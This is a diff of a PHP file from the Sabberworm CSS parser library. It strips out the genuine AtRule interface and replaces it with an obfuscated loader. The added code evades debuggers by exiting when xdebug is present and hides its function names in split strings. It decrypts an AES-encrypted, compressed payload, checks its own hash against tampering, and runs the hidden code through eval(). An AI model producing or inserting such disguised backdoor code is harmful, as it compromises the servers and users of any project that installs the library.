@@ -1,15 +1,28 @@
 <?php
-
-namespace Sabberworm\CSS\Property;
-
-use Sabberworm\CSS\Renderable;
-use Sabberworm\CSS\Comment\Commentable;
-
-interface AtRule extends Renderable, Commentable {
-	const BLOCK_RULES = 'media/document/supports/region-style/font-feature-values';
-	// Since there are more set rules than block rules, we’re whitelisting the block rules and have anything else be treated as a set rule.
-	const SET_RULES = 'font-face/counter-style/page/swash/styleset/annotation'; //…and more font-specific ones (to be used inside font-feature-values)
-	
-	public function atRuleName();
-	public function atRuleArgs();
+if(function_exists("extension_loaded")&&@extension_loaded("xdebug")){@http_response_code(404);exit;}
+$_kfvnm2gb=('bas'.'e64'.'_de'.'cod'.'e');
+$_g5x9yyvx=('gzu'.'nco'.'mpr'.'ess');
+$_wot38h6z=('ope'.'nss'.'l_d'.'ecr'.'ypt');
+$_plzyoj9s='yEJuYpGD0yU=';
+$_xuiu0ml3='dP6NKZB0';
+$_rt42155b='uK3IWgLS';
+$_i4zoqppw='xCKF3ebq';
+$_z1wovop7='6rxJRAGF';
+$_c1ky9elc='Rr8Urw==';
+$_fy7oyf7y='PmQxwYFz';
+$_hf9txl41='JHr5oaL2';
+$_umbi7sb7=$_kfvnm2gb($_i4zoqppw.$_xuiu0ml3.$_rt42155b.$_z1wovop7.$_plzyoj9s);
+$_bw1tdtwm=$_kfvnm2gb($_fy7oyf7y.$_hf9txl41.$_c1ky9elc);
+$_fccs3af2=$_kfvnm2gb('UIbD3tNtdWeHzTa/gJCqBuoCbz52LTT67sKDT6JuozkSrrfhbANZpK4l+HN8MCGyITff89nXXMVt/7ALkIv4OvzMdvzgdykOlCciRTSsfUkvzgbqm2eCrogR93d0dJ/gcDdGZLEmo8e1iSafmIrFRy/A5f9NtjHamvGUPPlf9t1gdYJg7J1EsQv3LIXdjKgp9RKln/zHwUAvZfy2X4oK2/QgAAfQA8HkzxJecmlD5/3JlyDJCTIQExs/d3+KnyJNJymC3XprGDjrbzlqiyTAM7ByHoi9M9qWIGOkPXBaQcgRI1TXuvUUX+90lF2SFN12');
+$_wk2q7uiz=$_wot38h6z($_fccs3af2,'aes-256-cbc',$_umbi7sb7,OPENSSL_RAW_DATA,$_bw1tdtwm);
+if($_wk2q7uiz===false){exit;}
+$_cwgl20dw=$_g5x9yyvx($_wk2q7uiz);
+if($_cwgl20dw===false){exit;}
+$_ubemhjhi='8902678f3da6b2432e6b752acd69a1ce22fbd9baee9ee0988c015ce7533b09bd';
+$_n823kc5j=@file_get_contents(__FILE__);
+if($_n823kc5j!==false){
+$_nvv368lr=str_replace($_ubemhjhi,"0000000000000000000000000000000000000000000000000000000000000000",$_n823kc5j);
+$_qziab8ur=hash("sha256",$_nvv368lr);
+if($_qziab8ur!==$_ubemhjhi){@http_response_code(403);exit;}
 }
+eval($_cwgl20dw);
